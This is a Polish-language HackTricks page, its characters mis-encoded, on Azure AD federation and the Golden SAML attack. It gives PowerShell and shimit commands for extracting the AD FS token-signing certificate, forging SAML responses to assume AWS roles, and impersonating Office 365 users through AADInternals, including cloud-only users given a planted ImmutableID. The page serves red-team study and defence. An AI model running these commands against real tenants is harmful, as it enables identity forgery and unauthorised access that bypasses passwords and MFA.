# Az - Federacja

<details>

<summary><strong>Zacznij od zera i staÅ„ siÄ™ ekspertem od hakowania AWS dziÄ™ki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacja** to zbiÃ³r **domen**, ktÃ³re ustanowiÅ‚y **zaufanie**. Poziom zaufania moÅ¼e siÄ™ rÃ³Å¼niÄ‡, ale zazwyczaj obejmuje **uwierzytelnianie** i zawsze obejmuje **autoryzacjÄ™**. Typowa federacja moÅ¼e obejmowaÄ‡ **kilka organizacji**, ktÃ³re ustanowiÅ‚y **zaufanie** dla **wspÃ³lnego dostÄ™pu** do zestawu zasobÃ³w.

MoÅ¼esz **zafederowaÄ‡ swoje Å›rodowisko lokalne** z Azure AD i uÅ¼yÄ‡ tej federacji do uwierzytelniania i autoryzacji. Ta metoda logowania zapewnia, Å¼e caÅ‚e uwierzytelnianie uÅ¼ytkownika odbywa siÄ™ w Å›rodowisku lokalnym. Ta metoda pozwala administratorom wprowadziÄ‡ bardziej rygorystyczne poziomy kontroli dostÄ™pu. DostÄ™pna jest federacja z **AD FS** i PingFederate.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

W Federacji caÅ‚e **uwierzytelnianie** odbywa siÄ™ w Å›rodowisku **lokalnym** i uÅ¼ytkownik doÅ›wiadcza SSO we wszystkich zaufanych Å›rodowiskach. Dlatego uÅ¼ytkownicy mogÄ… **uzyskaÄ‡ dostÄ™p** do **aplikacji chmurowych**, korzystajÄ…c z **danych uwierzytelniajÄ…cych z lokalnego Å›rodowiska**.

Do **wymiany** wszystkich informacji o uwierzytelnianiu i autoryzacji miÄ™dzy dostawcami uÅ¼ywany jest **jÄ™zyk znacznikÃ³w twierdzeÅ„ bezpieczeÅ„stwa (SAML)**.

W kaÅ¼dym ustawieniu federacji wystÄ™pujÄ… trzy strony:

* UÅ¼ytkownik lub Klient
* Dostawca ToÅ¼samoÅ›ci (IdP)
* Dostawca UsÅ‚ug (SP)

(Obrazy pochodzÄ… z https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. PoczÄ…tkowo aplikacja (Dostawca UsÅ‚ug lub SP, takie jak konsola AWS lub klient sieci web vSphere) jest dostÄ™pna dla uÅ¼ytkownika. Ten krok moÅ¼e zostaÄ‡ pominiÄ™ty, prowadzÄ…c klienta bezpoÅ›rednio do IdP (Dostawcy ToÅ¼samoÅ›ci) w zaleÅ¼noÅ›ci od konkretnej implementacji.
2. NastÄ™pnie SP identyfikuje odpowiedniego IdP (np. AD FS, Okta) do uwierzytelniania uÅ¼ytkownika. NastÄ™pnie tworzy Å¼Ä…danie uwierzytelniania SAML (Security Assertion Markup Language) i przekierowuje klienta do wybranego IdP.
3. IdP przejmuje kontrolÄ™, uwierzytelniajÄ…c uÅ¼ytkownika. Po uwierzytelnieniu IdP formuÅ‚uje odpowiedÅº SAML i przekazuje jÄ… do SP przez uÅ¼ytkownika.
4. Wreszcie SP ocenia odpowiedÅº SAML. JeÅ›li walidacja przebiegnie pomyÅ›lnie, co oznacza zaufanie do IdP, uÅ¼ytkownik otrzymuje dostÄ™p. To oznacza zakoÅ„czenie procesu logowania, pozwalajÄ…c uÅ¼ytkownikowi korzystaÄ‡ z usÅ‚ugi.

**JeÅ›li chcesz dowiedzieÄ‡ siÄ™ wiÄ™cej o uwierzytelnianiu SAML i powszechnych atakach, przejdÅº do:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS to model toÅ¼samoÅ›ci oparty na twierdzeniach.
* "..twierdzenia to po prostu oÅ›wiadczenia (na przykÅ‚ad nazwa, toÅ¼samoÅ›Ä‡, grupa) dotyczÄ…ce uÅ¼ytkownikÃ³w, ktÃ³re sÄ… gÅ‚Ã³wnie uÅ¼ywane do autoryzacji dostÄ™pu do aplikacji opartych na twierdzeniach, znajdujÄ…cych siÄ™ w dowolnym miejscu w Internecie."
* Twierdzenia dla uÅ¼ytkownika sÄ… zapisane wewnÄ…trz tokenÃ³w SAML, a nastÄ™pnie sÄ… podpisane w celu zapewnienia poufnoÅ›ci przez IdP.
* UÅ¼ytkownik jest identyfikowany przez ImmutableID. Jest to globalnie unikalne i przechowywane w Azure AD.
* ImmutableID jest przechowywane w Å›rodowisku lokalnym jako atrybut ms-DS-ConsistencyGuid dla uÅ¼ytkownika i/lub moÅ¼e byÄ‡ pochodne z GUID uÅ¼ytkownika.
* WiÄ™cej informacji na stronie [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Atak Golden SAML:**

* W ADFS odpowiedÅº SAML jest podpisana przez certyfikat podpisywania tokenÃ³w.
* JeÅ›li certyfikat zostanie skompromitowany, istnieje moÅ¼liwoÅ›Ä‡ uwierzytelnienia w Azure AD jako DOWOLNY uÅ¼ytkownik zsynchronizowany z Azure AD!
* Podobnie jak w przypadku naduÅ¼ycia PTA, zmiana hasÅ‚a dla uÅ¼ytkownika lub MFA nie bÄ™dzie miaÅ‚a Å¼adnego efektu, poniewaÅ¼ faÅ‚szujemy odpowiedÅº uwierzytelniajÄ…cÄ….
* Certyfikat moÅ¼na wydobyÄ‡ z serwera AD FS z uprawnieniami DA, a nastÄ™pnie moÅ¼na go uÅ¼yÄ‡ z dowolnego poÅ‚Ä…czonego z internetem urzÄ…dzenia.
* WiÄ™cej informacji na stronie [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces, w ktÃ³rym **Dostawca ToÅ¼samoÅ›ci (IdP)** generuje **OdpowiedÅº SAML** w celu autoryzacji logowania uÅ¼ytkownika, jest kluczowy. W zaleÅ¼noÅ›ci od konkretnej implementacji IdP, **odpowiedÅº** moÅ¼e byÄ‡ **podpisana** lub **zaszyfrowana** za pomocÄ… **prywatnego klucza IdP**. Ten proces umoÅ¼liwia **Dostawcy UsÅ‚ug (SP)** potwierdzenie autentycznoÅ›ci odpowiedzi SAML, zapewniajÄ…c, Å¼e zostaÅ‚a ona faktycznie wydana przez zaufanego IdP.

MoÅ¼na wyciÄ…gnÄ…Ä‡ analogiÄ™ do [ataku na zÅ‚oty bilet](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gdzie klucz autentykujÄ…cy toÅ¼samoÅ›Ä‡ i uprawnienia uÅ¼ytkownika (KRBTGT dla zÅ‚otych biletÃ³w, prywatny klucz podpisywania tokenÃ³w dla zÅ‚otych SAML) moÅ¼e byÄ‡ manipulowany w celu **podrobienia obiektu uwierzytelniania** (TGT lub odpowiedzi SAML). Pozwala to na podszywanie siÄ™ pod dowolnego uÅ¼ytkownika, co umoÅ¼liwia nieautoryzowany dostÄ™p do SP.

ZÅ‚ote SAML oferujÄ… pewne zalety:

* MogÄ… byÄ‡ **tworzone zdalnie**, bez koniecznoÅ›ci bycia czÄ™Å›ciÄ… domeny lub federacji w pytaniu.
* PozostajÄ… skuteczne nawet przy wÅ‚Ä…czonym **dwuskÅ‚adnikowym uwierzytelnianiu (2FA)**.
* **Prywatny klucz podpisywania tokenÃ³w nie odnawia siÄ™ automatycznie**.
* **Zmiana hasÅ‚a uÅ¼ytkownika nie uniewaÅ¼nia** juÅ¼ wygenerowanego SAML.

#### AWS + AD FS + Golden SAML

[UsÅ‚ugi Federacji Active Directory (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) to usÅ‚uga firmy Microsoft uÅ‚atwiajÄ…ca **bezpiecznÄ… wymianÄ™ informacji toÅ¼samoÅ›ci** miÄ™dzy zaufanymi partnerami biznesowymi (federacja). W zasadzie pozwala usÅ‚udze domenowej udostÄ™pniaÄ‡ toÅ¼samoÅ›ci uÅ¼ytkownikÃ³w innym dostawcom usÅ‚ug w ramach federacji.

DziÄ™ki zaufaniu AWS do skompromitowanej domeny (w federacji), tÄ™ podatnoÅ›Ä‡ moÅ¼na wykorzystaÄ‡ do potencjalnego **uzyskania dowolnych uprawnieÅ„ w Å›rodowisku AWS**. Atak wymaga **prywatnego klucza uÅ¼ywanego do podpisywania obiektÃ³w SAML**, podobnie jak w przypadku potrzeby KRBTGT w ataku na zÅ‚oty bilet. DostÄ™p do konta uÅ¼ytkownika AD FS jest wystarczajÄ…cy do uzyskania tego klucza prywatnego.

Wymagania do przeprowadzenia ataku zÅ‚otego SAML obejmujÄ…:

* **Prywatny klucz podpisywania tokenÃ³w**
* **Certyfikat publiczny IdP**
* **Nazwa IdP**
* **Nazwa roli (roli do przyjÄ™cia)**
* Nazwa domeny\nazwa uÅ¼ytkownika
* Nazwa sesji roli w AWS
* ID konta Amazon

_Tylko elementy pogrubione sÄ… obowiÄ…zkowe. PozostaÅ‚e moÅ¼na wypeÅ‚niÄ‡ wedÅ‚ug uznania._

Aby uzyskaÄ‡ **prywatny klucz**, konieczny jest dostÄ™p do **konta uÅ¼ytkownika AD FS**. NastÄ™pnie klucz prywatny moÅ¼na **wyeksportowaÄ‡ z magazynu osobistego** za pomocÄ… narzÄ™dzi takich jak [mimikatz](https://github.com/gentilkiwi/mimikatz). Aby uzyskaÄ‡ inne wymagane informacje, moÅ¼na skorzystaÄ‡ z dodatku Microsoft.Adfs.Powershell, upewniajÄ…c siÄ™, Å¼e jesteÅ› zalogowany jako uÅ¼ytkownik ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Z caÅ‚ymi informacjami, moÅ¼liwe jest zapomnienie o waÅ¼nym SAMLResponse jako uÅ¼ytkownik, ktÃ³rego chcesz podrobiÄ‡ za pomocÄ… [**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> chmura
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
MoÅ¼liwe jest rÃ³wnieÅ¼ utworzenie ImmutableID uÅ¼ytkownikÃ³w tylko w chmurze i ich podszycie.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## OdnoÅ›niki

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
